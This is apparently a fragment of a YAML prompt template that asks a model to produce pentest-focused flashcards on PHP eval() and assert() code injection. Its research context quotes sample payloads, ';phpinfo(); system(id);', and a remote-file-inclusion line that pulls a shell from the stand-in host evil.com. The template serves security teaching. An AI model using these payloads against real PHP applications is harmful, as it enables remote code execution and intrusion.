active_learning:
  discussion_prompt: In a debate format, argue for or against the use of eval() and assert() in modern PHP applications, weighing
    security risks (e.g., ACE) against legitimate use cases like dynamic configuration or debugging.
  peer_teaching: Explain the key concepts to a partner without using technical jargon.
  problem_solving: Given a scenario, apply the framework to solve the problem.

    is safe with htmlspecialchars'' vs. reality: it executes before sanitization); near-misses (e.g., SQLi payload instead
    of PHP); outdated facts (e.g., ''assert() safe in PHP 8''). Ensure one distractor is a frequent pentest error.'

  Incorporate these elements:

  - Learning Objectives: [insert full list above].

  - Active Learning: Inspire critical thinking via [discussion_prompt], [peer_teaching_activity], [problem_solving_exercise].

  - Scaffolding: Cover 4 layers progressively: [layer1_foundation], [layer2_components], [layer3_implementation], [layer4_integration].

  - Research Context: PHP code injection via eval() (executes strings as code) and assert() (pre-PHP8 executes strings if
  zend.assert=ASSERT_CODE); payloads like '';phpinfo(); system(id);''; links to LFI/RFI (e.g., RFI: include(''http://evil.com/shell.php''));
  detection (fuzzing, Burp); mitigations (disable_functions, whitelisting, PHP8+). Sources: OWASP Injection Prevention, PHP
  Manual (php.net/manual/en/function.eval.php).


  Generate flashcards per this schema: [insert full flashcard_schema above]. Ensure progression from lower to higher Bloom’s
  levels, real-world pentest focus (DVWA, Burp), ethical hacking emphasis (detection/mitigation). Output ONLY a JSON array
  of 40-50 flashcards, grouped by Bloom’s level: {''remember_understand'': [...], ''apply'': [...], ''analyze'': [...], ''evaluate_create'':
  [...]}. No additional text.'
